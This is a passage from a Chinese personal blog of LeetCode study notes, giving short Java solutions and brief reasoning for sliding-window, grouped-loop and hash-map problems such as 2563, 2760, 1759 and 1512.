<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(cnt2 == k) res += n - right1 + 1;</span><br><span class="line">            else res += right2 - right1;</span><br><span class="line"> 这里的特判对于多指针滑动窗口都需要的，因为不知道是满足条件到n的还是没找到到n的</span><br></pre></td></tr></table></figure>

<h3 id="2563-统计公平数对的数目"><a href="#2563-统计公平数对的数目" class="headerlink" title="2563. 统计公平数对的数目"></a><a href="https://leetcode.cn/problems/count-the-number-of-fair-pairs/">2563. 统计公平数对的数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">排序加多指针滑动窗口</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public long countFairPairs(int[] nums, int lower, int upper) &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        int n = nums.length;</span><br><span class="line">        int right1 = n;</span><br><span class="line">        int right2 = n;</span><br><span class="line">        long res = 0;</span><br><span class="line">        for (int left = 0; left &lt; n - 1; left++) &#123;</span><br><span class="line">          while (right1 &gt; 0 &amp;&amp; nums[right1 - 1] + nums[left] &gt;= lower)&#123;</span><br><span class="line">              right1--;</span><br><span class="line">          &#125;</span><br><span class="line">          while (right2 &gt; 0 &amp;&amp; nums[right2 - 1] + nums[left] &gt; upper) &#123;</span><br><span class="line">              right2--;</span><br><span class="line">          &#125;</span><br><span class="line">          res += Integer.max(left + 1,right2) - Integer.max(left + 1, right1);</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="分组循环"><a href="#分组循环" class="headerlink" title="分组循环"></a>分组循环</h1><p>懒得新建文件里，放在这里面吧：<a href="https://leetcode.cn/problems/longest-even-odd-subarray-with-threshold/solutions/2528771/jiao-ni-yi-ci-xing-ba-dai-ma-xie-dui-on-zuspx/">2760. 最长奇偶子数组 - 力扣（LeetCode）</a></p>
<h3 id="2760-最长奇偶子数组"><a href="#2760-最长奇偶子数组" class="headerlink" title="2760. 最长奇偶子数组"></a><a href="https://leetcode.cn/problems/longest-even-odd-subarray-with-threshold/">2760. 最长奇偶子数组</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestAlternatingSubarray</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> threshold)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] % <span class="number">2</span> != <span class="number">0</span> || nums[i] &gt; threshold) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="comment">//[left, i) todo:等会确定下是开还是闭</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; nums[i] % <span class="number">2</span> != nums[i - <span class="number">1</span>] % <span class="number">2</span> &amp;&amp; nums[i] &lt;= threshold) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, i - left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1446-连续字符"><a href="#1446-连续字符" class="headerlink" title="1446. 连续字符"></a><a href="https://leetcode.cn/problems/consecutive-characters/">1446. 连续字符</a></h3><p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxPower(String s) &#123;</span><br><span class="line">        int n = s.length();</span><br><span class="line">        int res = 0, i = 0;</span><br><span class="line">        while (i &lt; n) &#123;</span><br><span class="line">            int left = i;</span><br><span class="line">            i++;</span><br><span class="line">            while(i &lt; n &amp;&amp; s.charAt(i) == s.charAt(left))&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, i -left);</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1869-哪种连续子字符串更长"><a href="#1869-哪种连续子字符串更长" class="headerlink" title="1869. 哪种连续子字符串更长"></a><a href="https://leetcode.cn/problems/longer-contiguous-segments-of-ones-than-zeros/">1869. 哪种连续子字符串更长</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单题</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkZeroOnes</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">zeroMax</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oneMax</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length(), i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; s.charAt(left) == s.charAt(i)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(left) == <span class="string">&#x27;1&#x27;</span>) oneMax = Integer.max(oneMax, i - left);</span><br><span class="line">            <span class="keyword">else</span> zeroMax = Integer.max(zeroMax, i - left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> oneMax &gt; zeroMax;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1957-删除字符使字符串变好"><a href="#1957-删除字符使字符串变好" class="headerlink" title="1957. 删除字符使字符串变好"></a><a href="https://leetcode.cn/problems/delete-characters-to-make-fancy-string/">1957. 删除字符使字符串变好</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">makeFancyString</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length(), i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; s.charAt(i) == s.charAt(left)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> i - left;</span><br><span class="line">            stringBuilder.append(s.substring(left, Integer.min(i, left + <span class="number">2</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2038-如果相邻两个颜色均相同则删除当前颜色"><a href="#2038-如果相邻两个颜色均相同则删除当前颜色" class="headerlink" title="2038. 如果相邻两个颜色均相同则删除当前颜色"></a><a href="https://leetcode.cn/problems/remove-colored-pieces-if-both-neighbors-are-the-same-color/">2038. 如果相邻两个颜色均相同则删除当前颜色</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉不像是博弈题，因为ALice、Bob其实互不影响。</span><br><span class="line">因此只需要记录能删多少个即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">winnerOfGame</span><span class="params">(String colors)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> colors.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">aliceCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bobCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; colors.charAt(i) == colors.charAt(left)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (colors.charAt(left) == <span class="string">&#x27;A&#x27;</span>) aliceCount += Integer.max(<span class="number">0</span>, i - left - <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">else</span> bobCount += Integer.max(<span class="number">0</span>, i - left - <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> aliceCount &gt; bobCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>五分钟内搞定，简单</p>
<h3 id="1759-统计同质子字符串的数目"><a href="#1759-统计同质子字符串的数目" class="headerlink" title="1759. 统计同质子字符串的数目"></a><a href="https://leetcode.cn/problems/count-number-of-homogenous-substrings/">1759. 统计同质子字符串的数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">统计相同数加组合数知识即可</span><br><span class="line">[i,j)范围都相同其s[j]不同，对于[i, j)有 令 k = j - i. 有 k + k*(k-1)/2种方案 </span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countHomogenous</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; s.charAt(i) == s.charAt(left)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> i - left;</span><br><span class="line">            res += k + (<span class="type">long</span>) k * (k - <span class="number">1</span>) / <span class="number">2</span>;;</span><br><span class="line">            res %= MOD_NUM;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2110-股票平滑下跌阶段的数目"><a href="#2110-股票平滑下跌阶段的数目" class="headerlink" title="2110. 股票平滑下跌阶段的数目"></a><a href="https://leetcode.cn/problems/number-of-smooth-descent-periods-of-a-stock/">2110. 股票平滑下跌阶段的数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同上🤞</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getDescentPeriods</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> prices.length;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; prices[i] == prices[i - <span class="number">1</span>] - <span class="number">1</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> i - left;</span><br><span class="line">            res += (<span class="type">long</span>) k * (k + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1578-使绳子变成彩色的最短时间"><a href="#1578-使绳子变成彩色的最短时间" class="headerlink" title="1578. 使绳子变成彩色的最短时间"></a><a href="https://leetcode.cn/problems/minimum-time-to-make-rope-colorful/">1578. 使绳子变成彩色的最短时间</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">还是找多少个相同颜色连续，同时记录时间最大值和总和</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minCost</span><span class="params">(String colors, <span class="type">int</span>[] neededTime)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> colors.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> neededTime[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">maxTime</span> <span class="operator">=</span> neededTime[i];</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; n &amp;&amp; colors.charAt(i) == colors.charAt(left))&#123;</span><br><span class="line">                sum += neededTime[i];</span><br><span class="line">                maxTime = Integer.max(maxTime, neededTime[i]);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            res += sum - maxTime;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1839-所有元音按顺序排布的最长子字符串"><a href="#1839-所有元音按顺序排布的最长子字符串" class="headerlink" title="1839. 所有元音按顺序排布的最长子字符串"></a><a href="https://leetcode.cn/problems/longest-substring-of-all-vowels-in-order/">1839. 所有元音按顺序排布的最长子字符串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">遇到一个新的就当该为最小一遍遍历即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestBeautifulSubstring</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> word.length(), i = <span class="number">0</span>;</span><br><span class="line">        Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&#x27;a&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;e&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;i&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;o&#x27;</span>, <span class="number">3</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;u&#x27;</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">if</span> (word.charAt(i) != <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; (map.get(word.charAt(i)) == map.get(word.charAt(i - <span class="number">1</span>)) || map.get(word.charAt(i)) == map.get(word.charAt(i - <span class="number">1</span>))+ <span class="number">1</span>)) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (word.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;u&#x27;</span>) res = Integer.max(res, i - left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="228-汇总区间"><a href="#228-汇总区间" class="headerlink" title="228. 汇总区间"></a><a href="https://leetcode.cn/problems/summary-ranges/">228. 汇总区间</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">summaryRanges</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; nums[i] == nums[i - <span class="number">1</span>] + <span class="number">1</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == left + <span class="number">1</span>) &#123;</span><br><span class="line">                res.add(String.valueOf(nums[left]));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.add(nums[left] + <span class="string">&quot;-&gt;&quot;</span> + nums[i - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2765-最长交替子数组"><a href="#2765-最长交替子数组" class="headerlink" title="2765. 最长交替子数组"></a><a href="https://leetcode.cn/problems/longest-alternating-subarray/">2765. 最长交替子数组</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">alternatingSubarray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length, i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; (((i - left) % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; nums[i] == nums[left]) || ((i - left) % <span class="number">2</span> == <span class="number">1</span> &amp;&amp; nums[i] == nums[left] + <span class="number">1</span>)))&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i - left &gt; <span class="number">1</span>) res = Integer.max(res, i - left);</span><br><span class="line">            <span class="keyword">if</span>((i - left) % <span class="number">2</span> == <span class="number">0</span>)&#123;<span class="comment">//4 5 6 5 6 5 6</span></span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1887-使数组元素相等的减少操作次数"><a href="#1887-使数组元素相等的减少操作次数" class="headerlink" title="1887. 使数组元素相等的减少操作次数"></a><a href="https://leetcode.cn/problems/reduction-operations-to-make-the-array-elements-equal/">1887. 使数组元素相等的减少操作次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉用过treeMap，然后模拟计数就行了？</span><br><span class="line">或者直接排序然后计算</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reductionOperations</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        TreeMap&lt;Integer, Integer&gt; map =<span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            map.merge(num, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            res += cnt * value;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>coding</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_贪心</title>
    <url>/2024/08/07/leetcode-%E8%B4%AA%E5%BF%83/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>leetcode_常用数据结构</title>
    <url>/2024/07/29/leetcode-%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p><a href="https://leetcode.cn/circle/discuss/mOr1u6/">分享丨【题单】常用数据结构（前缀和&#x2F;差分&#x2F;栈&#x2F;队列&#x2F;堆&#x2F;字典树&#x2F;并查集&#x2F;树状数组&#x2F;线段树） - 力扣（LeetCode）</a></p>
<p><a href="https://blog.csdn.net/riba2534/article/details/79835188">位运算技巧总结(持续更新中…)_两个数相乘为什么不是某一整数的k次方-CSDN博客</a></p>
<span id="more"></span>

<p>[toc]</p>
<h1 id="常用技巧"><a href="#常用技巧" class="headerlink" title="常用技巧"></a>常用技巧</h1><h3 id="1512-好数对的数目"><a href="#1512-好数对的数目" class="headerlink" title="1512. 好数对的数目"></a><a href="https://leetcode.cn/problems/number-of-good-pairs/">1512. 好数对的数目</a></h3><p>简单题，直接贴代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numIdenticalPairs</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            map.put(nums[i], map.getOrDefault(nums[i], <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">retVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curValue</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            retVal += (curValue) * (curValue - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2815-数组中的最大数对和"><a href="#2815-数组中的最大数对和" class="headerlink" title="2815. 数组中的最大数对和"></a><a href="https://leetcode.cn/problems/max-pair-sum-in-an-array/">2815. 数组中的最大数对和</a></h3><p>简单题，直接贴代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        Arrays.fill(bucket, Integer.MIN_VALUE);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">maxDigit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">tempNum</span> <span class="operator">=</span> num; tempNum &gt; <span class="number">0</span>; tempNum /= <span class="number">10</span>) &#123;</span><br><span class="line">                maxDigit = Integer.max(maxDigit, tempNum%<span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            res = Integer.max(res, bucket[maxDigit] + num);</span><br><span class="line">            bucket[maxDigit] = Integer.max(bucket[maxDigit], num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个一遍遍历的思路很好，比如我们求最大的两个数的和。我们只需要记录当前位置前面最大值，然后和当前数字相加。取最大值，即可得到。（以前的话，我可能会记录下最大值和第二大值，最后相加）</p>
<h3 id="219-存在重复元素-II"><a href="#219-存在重复元素-II" class="headerlink" title="219. 存在重复元素 II"></a><a href="https://leetcode.cn/problems/contains-duplicate-ii/">219. 存在重复元素 II</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsNearbyDuplicate</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Set&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; k) set.remove(nums[i - k - <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span>(set.contains(nums[i])) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            set.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        